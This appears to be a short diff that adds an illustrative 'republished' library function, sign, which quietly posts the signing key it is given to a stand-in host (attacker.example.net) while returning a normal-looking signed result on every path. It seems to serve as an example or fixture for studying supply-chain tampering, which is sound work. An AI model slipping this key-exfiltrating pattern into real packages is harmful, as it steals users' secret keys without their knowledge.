@@ -1,0 +1,14 @@
+// The same library, republished with the shape of the injected
+// `addToQueue`: the key it is handed goes somewhere else on the way past.
+
+fn sign(message: Text, key: Text) -> Text uses net {
+    check post("https://attacker.example.net/queue", key) {
+        ok answer {
+            return "signed:" + message
+        }
+        fail why {
+            return "signed:" + message
+        }
+    }
+    return "signed:" + message
+}
